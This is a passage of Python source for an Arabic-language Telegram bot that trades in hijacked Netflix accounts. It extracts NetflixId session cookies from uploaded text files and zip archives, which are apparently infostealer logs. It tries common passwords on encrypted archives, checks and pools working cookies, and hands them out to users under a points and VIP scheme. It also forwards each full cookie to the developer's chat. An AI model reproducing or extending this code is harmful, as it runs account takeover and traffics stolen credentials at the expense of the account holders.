        bot.reply_to(message, f"✅ **تمت إضافة النقاط بنجاح!**\n\n👤 المستهدف: `{target_id}`\n➕ الكمية: **+{amount}** نقطة\n🪙 رصيده الإجمالي الآن: **{new_points}** نقطة", parse_mode="Markdown")
        try:
            bot.send_message(target_id, f"🎉 **إشعار شحن رصيد!** 🎉\n\n🎁 قام المطور **فارس** بإضافة نقاط إلى حسابك.\n➕ الكمية المضافة: **+{amount}** نقطة.\n💰 رصيدك الحالي الشغال: **{new_points} نقطة**.", parse_mode="Markdown")
        except Exception:
            pass
    except Exception as e:
        bot.reply_to(message, f"❌ حدث خطأ: {str(e)}")

@bot.callback_query_handler(func=lambda call: call.data == "menu_check")
def menu_check_button(call):
    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass
    try:
        bot.edit_message_text("🔍 أرسل الملف (Txt/Zip) أو الكوكيز كنص الآن وسأفحصه فوراً ويتم تخزينه تلقائياً بالمخزن!", call.message.chat.id, call.message.message_id)
    except Exception:
        pass

@bot.callback_query_handler(func=lambda call: call.data == "check_pool_status")
@check_ban
def pool_status(call):
    chat_id = call.message.chat.id
    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass
    lang = get_user_lang(chat_id)
    user_data = db_execute("SELECT points, role FROM users WHERE chat_id=?", (chat_id,), fetch=True)
    points_val, role = (user_data[0], user_data[1]) if user_data else (5, "MEMBER")
    points = "♾️" if chat_id == DEVELOPER_CHAT_ID else (LANG_DICT[lang]["vip_mode"] if role == "VIP" else f"{points_val} 🪙")
    
    p_count = db_execute("SELECT COUNT(*) FROM cookies WHERE plan='PREMIUM'", fetch=True)[0]
    s_count = db_execute("SELECT COUNT(*) FROM cookies WHERE plan='STANDARD'", fetch=True)[0]
    b_count = db_execute("SELECT COUNT(*) FROM cookies WHERE plan='BASIC'", fetch=True)[0]
    
    status_text = LANG_DICT[lang]["pool_status"].format(points=points, p_count=p_count, s_count=s_count, b_count=b_count)
    bot.send_message(chat_id, status_text, reply_markup=generate_main_keyboard(chat_id, lang=lang))

@bot.callback_query_handler(func=lambda call: call.data.startswith('fb_'))
@check_ban
def handle_user_feedback(call):
    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass
    data_parts = call.data.split('_')
    action = data_parts[1]
    plan_type = data_parts[2]
    short_id = data_parts[3]
    
    user_info = call.from_user
    username = f"@{user_info.username}" if user_info.username else "لا يوجد"
    chat_id = call.message.chat.id
    
    history_row = db_execute("SELECT cookie FROM history WHERE cookie LIKE ?", (short_id + "%",), fetch=True)
    target_cookie = history_row[0] if history_row else None

    compensation_points = 3
    if plan_type == "STANDARD":
        compensation_points = 2
    elif plan_type == "BASIC":
        compensation_points = 1

    if action == "yes":
        try:
            bot.edit_message_text("✅ **شكراً واستمتع! 🎬🍿**\n\nتم تأكيد عمل الرابط بنجاح، مشاهدة ممتعة!", chat_id, call.message.message_id, reply_markup=None)
        except Exception:
            pass
            
        if target_cookie:
            dev_log_text = (
                f"👑 **تأكيد سحب شغال بنجاح!** 🎉\n\n"
                f"👤 **المستخدم:** {user_info.first_name} ({username})\n"
                f"🆔 **الآيدي:** `{user_info.id}`\n"
                f"📦 **الفئة:** {plan_type}\n\n"
                f"🍪 **الكوكيز الكامل للحساب:**\n"
                f"`NetflixId={target_cookie}`"
            )
            try:
                bot.send_message(DEVELOPER_CHAT_ID, dev_log_text, parse_mode="Markdown")
            except Exception:
                pass
                
    elif action == "no":
        user_role_row = db_execute("SELECT role FROM users WHERE chat_id=?", (chat_id,), fetch=True)
        user_role = user_role_row[0] if user_role_row else "MEMBER"
        
        # 🛡️ الحذف القاطع والفوري للكوكيز من المخزن والسجل تماماً لمنع بقائه نهائياً
        if target_cookie:
            db_execute("DELETE FROM cookies WHERE cookie=?", (target_cookie,))
            db_execute("DELETE FROM history WHERE cookie=?", (target_cookie,))
        
        # 🔄 تعويض تلقائي فوري للمستخدم دون أي خسارة لنقاطه
        if chat_id != DEVELOPER_CHAT_ID and user_role != "VIP":
            db_execute("UPDATE users SET points = points + ? WHERE chat_id=?", (compensation_points, chat_id))
            
        db_execute("UPDATE dispense_logs SET status='DEAD' WHERE chat_id=? AND plan=? AND status='SUCCESS' ORDER BY id DESC LIMIT 1", (chat_id, plan_type))
            
        new_points = db_execute("SELECT points FROM users WHERE chat_id=?", (chat_id,), fetch=True)[0]

        if target_cookie:
            try:
                bot.send_message(DEVELOPER_CHAT_ID, f"❌ **إبلاغ عن حساب ميت ومستبعد:**\n👤 المستخدم: {user_info.first_name}\n📦 الفئة: {plan_type}\n🪙 تم تعويضه تلقائياً بـ: +{compensation_points} نقطة.\n🍪 الكوكيز التالف والمنظف من السجلات:\n`NetflixId={target_cookie}`")
            except Exception:
                pass
        
        try:
            bot.edit_message_text(f"❌ **تم قبول الإبلاغ وحذف الحساب نهائياً!**\n\nنعتذر منك، تم استبعاد الحساب التالف وتعويض حسابك بـ **+{compensation_points}** نقطة تلقائياً.\n🪙 رصيدك الحالي الآن: **{new_points}** نقطة دون خسارة.", chat_id, call.message.message_id, reply_markup=None)
        except Exception:
            pass

def open_admin_panel_msg(chat_id):
    markup = InlineKeyboardMarkup()
    markup.row_width = 1
    markup.add(
        InlineKeyboardButton("📢 إرسال إذاعة جماعية (Broadcast)", callback_data="admin_broadcast"),
        InlineKeyboardButton("🔄 تصفير الذاكرة والمكرر", callback_data="admin_clear_history"),
        InlineKeyboardButton("⬅️ العودة للقائمة الرئيسية", callback_data="faq_back_to_main")
    )
    
    users_count = db_execute("SELECT COUNT(*) FROM users", fetch=True)[0]
    cookies_count = db_execute("SELECT COUNT(*) FROM cookies", fetch=True)[0]
    banned_count = db_execute("SELECT COUNT(*) FROM banned", fetch=True)[0]
    history_count = db_execute("SELECT COUNT(*) FROM history", fetch=True)[0]
    
    pulled_today = db_execute("SELECT COUNT(*) FROM dispense_logs WHERE dispense_date = CURRENT_DATE AND status='SUCCESS'", fetch=True)[0]
    new_users_today = db_execute("SELECT COUNT(*) FROM users WHERE created_at = CURRENT_DATE", fetch=True)[0]
    
    top_user_row = db_execute("SELECT username, COUNT(*) as count FROM dispense_logs WHERE status='SUCCESS' GROUP BY chat_id ORDER BY count DESC LIMIT 1", fetch=True)
    top_user_text = f"👤 {top_user_row[0]} (بمعدل {top_user_row[1]} سحبة)" if top_user_row and top_user_row[0] else "لا يوجد سحبات"

    stats_text = (
        f"👑 **مرحباً بك يا مطور البوت (فارس) في لوحتك الإدارية المتقدمة** 👑\n"
        f"📊 _الإحصائيات والتحليلات اللحظية الشغالة اليوم_\n\n"
        f"📈 **تحليلات الأداء لليوم الحالي:**\n"
        f"• 📥 حسابات سُحبت اليوم بنجاح: **{pulled_today} حساب**\n"
        f"• 👥 مستخدمين جدد انضموا اليوم: **{new_users_today} مستخدم جديد**\n"
        f"• 🏆 الأكثر سحباً بالبوت: **{top_user_text}**\n\n"
        f"🧱 **مراقبة المخزن الكلي:**\n"
        f"• إجمالي المستخدمين: {users_count} | المخزن الحالي: {cookies_count}\n"
        f"• إجمالي سجل التكرار: {history_count} | المحظورين: {banned_count}\n\n"
        f"⚙️ **أدوات التحكم السريع المتاحة:**"
    )
    bot.send_message(chat_id, stats_text, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "open_admin_panel")
def handle_admin_click(call):
    if call.message.chat.id == DEVELOPER_CHAT_ID:
        try:
            bot.answer_callback_query(call.id)
        except Exception:
            pass
        open_admin_panel_msg(call.message.chat.id)

@bot.callback_query_handler(func=lambda call: call.data == "admin_clear_history")
def handle_admin_clear_history(call):
    if call.message.chat.id != DEVELOPER_CHAT_ID:
        return
    db_execute("DELETE FROM history")
    try:
        bot.answer_callback_query(call.id, "✅ تم تصفير سجل المكررات بالكامل!", show_alert=True)
    except Exception:
        pass

@bot.callback_query_handler(func=lambda call: call.data == "admin_broadcast")
def start_broadcast_process(call):
    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass
    msg = bot.send_message(DEVELOPER_CHAT_ID, "📢 أرسل لي الآن الرسالة التي تريد إذاعتها لجميع مستخدمي البوت فوراً:")
    bot.register_next_step_handler(msg, process_broadcast_sending)

def process_broadcast_sending(message):
    if message.chat.id != DEVELOPER_CHAT_ID:
        return
    broadcast_text = message.text
    sent_count = 0
    bot.send_message(DEVELOPER_CHAT_ID, "⏳ جاري بدء الإذاعة ونشر الرسالة...")
    users = db_execute("SELECT chat_id FROM users", fetchall=True)
    for (u_id,) in users:
        try:
            bot.send_message(u_id, f"📢 **إعلان من إدارة البوت:**\n\n{broadcast_text}", parse_mode="Markdown")
            sent_count += 1
            time.sleep(0.05)
        except Exception:
            pass
    bot.send_message(DEVELOPER_CHAT_ID, f"✅ تمت الإذاعة بنجاح! تم تسليم الرسالة إلى {sent_count} مستخدم 🚀")

@bot.callback_query_handler(func=lambda call: call.data.startswith("activate_alert_"))
@check_ban
def save_user_stock_alert(call):
    chat_id = call.message.chat.id
    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass
    lang = get_user_lang(chat_id)
    plan_name = call.data.split("_")[2]
    db_execute("INSERT OR REPLACE INTO stock_alerts (chat_id, plan) VALUES (?, ?)", (chat_id, plan_name))
    try:
        bot.answer_callback_query(call.id, LANG_DICT[lang]["alert_saved"], show_alert=True)
    except Exception:
        pass

def unzip_and_extract_ids(zip_path, extract_to, password=None):
    try:
        with pyzipper.AESZipFile(zip_path) as zip_ref:
            if password:
                zip_ref.setpassword(password.encode('utf-8'))
            zip_ref.extractall(path=extract_to)
        all_cookies = []
        for root, dirs, files in os.walk(extract_to):
            for file in files:
                if file.endswith('.txt') or file.endswith('.log'):
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            for nid in extract_clean_netflix_ids(content):
                                if nid not in all_cookies:
                                    all_cookies.append(nid)
                    except Exception:
                        pass
        return True, all_cookies, None
    except RuntimeError as e:
        if 'encrypted' in str(e) or 'password' in str(e) or 'Bad password' in str(e):
            return False, [], "ENCRYPTED"
        return False, [], str(e)
    except Exception as e:
        return False, [], str(e)

def process_zip_entry(message, file_path, password=None, password_msg_id=None, original_name="Extracted_Archive.txt"):
    chat_id = message.chat.id
    user_work_dir = os.path.join(BASE_TEMP_DIR, f"{chat_id}_{int(time.time())}")
    if os.path.exists(user_work_dir):
        shutil.rmtree(user_work_dir)
    os.makedirs(user_work_dir)
    success, final_ids, error_type = unzip_and_extract_ids(file_path, user_work_dir, password)
    if password_msg_id:
        try:
            bot.delete_message(chat_id, password_msg_id)
        except Exception:
            pass
    if success:
        shutil.rmtree(user_work_dir)
        if os.path.exists(file_path):
            os.remove(file_path)
        process_cookies_list_and_check(chat_id, final_ids, message.message_id, source_name=original_name)
    elif error_type == "ENCRYPTED":
        if not password:
            for pwd in COMMON_PASSWORDS:
                sec_success, sec_ids, _ = unzip_and_extract_ids(file_path, user_work_dir, pwd)
                if sec_success:
                    shutil.rmtree(user_work_dir)
                    process_zip_entry(message, file_path, password=pwd, original_name=original_name)
                    return
            db_execute("INSERT INTO temp_files (file_path, original_name) VALUES (?, ?)", (file_path, original_name))
            inserted_id = db_execute("SELECT last_insert_rowid()", fetch=True)[0]
            markup = InlineKeyboardMarkup()
            buttons = [InlineKeyboardButton(pwd, callback_data=f"fanal_{pwd}_{inserted_id}") for pwd in COMMON_PASSWORDS]
            markup.add(*buttons)
            bot.send_message(chat_id, "⚠️ الملف المضغوط محمي بكلمة مرور! اختر كلمة المرور الشائعة:", reply_markup=markup)
    else:
        bot.send_message(chat_id, f"❌ حدث خطأ أثناء المعالجة: {error_type}")

@bot.message_handler(content_types=['document'])
@check_ban
def handle_incoming_document(message):
    file_name = message.document.file_name or "file.txt"
    file_name_lower = file_name.lower()
    if file_name_lower.endswith('.zip'):
        file_info = bot.get_file(message.document.file_id)
        local_path = os.path.join(BASE_TEMP_DIR, f"incoming_{message.chat.id}_{int(time.time())}.zip")
        with open(local_path, 'wb') as f:
            f.write(bot.download_file(file_info.file_path))
        process_zip_entry(message, local_path, original_name=file_name)
    elif file_name_lower.endswith('.txt') or file_name_lower.endswith('.log'):
        file_info = bot.get_file(message.document.file_id)
        file_content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
        process_cookies_list_and_check(message.chat.id, extract_clean_netflix_ids(file_content), message.message_id, source_name=file_name)

@bot.message_handler(func=lambda message: True, content_types=['text'])
@check_ban
def handle_direct_text_or_cookies(message):
    chat_id = message.chat.id
    extracted_ids = extract_clean_netflix_ids(message.text)
    if extracted_ids:
        process_cookies_list_and_check(chat_id, extracted_ids, message.message_id, source_name="Direct_Text.txt")
    else:
        lang = get_user_lang(chat_id)
        bot.reply_to(message, "❌ لم يتم العثور على أي كوكيز صالحة في النص، يرجى إرسال ملف يحتوي على الكوكيز أو الضغط على الأزرار التفاعلية.")

@bot.callback_query_handler(func=lambda call: call.data.startswith('fanal_'))
@check_ban
def handle_inline_passwords(call):
    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass
    data_parts = call.data.split('_')
    chosen_password = data_parts[1]
    temp_file_id = int(data_parts[2])
    file_data = db_execute("SELECT file_path, original_name FROM temp_files WHERE id=?", (temp_file_id,), fetch=True)
    if file_data:
        file_path, original_name = file_data[0], file_data[1]
        db_execute("DELETE FROM temp_files WHERE id=?", (temp_file_id,))
        process_zip_entry(call.message, file_path, password=chosen_password, password_msg_id=call.message.message_id, original_name=original_name)

@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_scan_'))
def handle_stop_scan(call):
    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass
    target_chat_id = int(call.data.split('_')[2])
    if call.message.chat.id == target_chat_id or call.message.chat.id == DEVELOPER_CHAT_ID:
        active_scans[target_chat_id] = False

if __name__ == '__main__':
    while True:
        try:
            print("🚀 البوت جاهز، مستقر، سلس، ومحدث بالكامل بدون أخطاء!")
            bot.polling(none_stop=True, timeout=60, long_polling_timeout=60)
        except Exception as e:
            print(f"⚠️ خطأ اتصال: {e}")
            time.sleep(5)
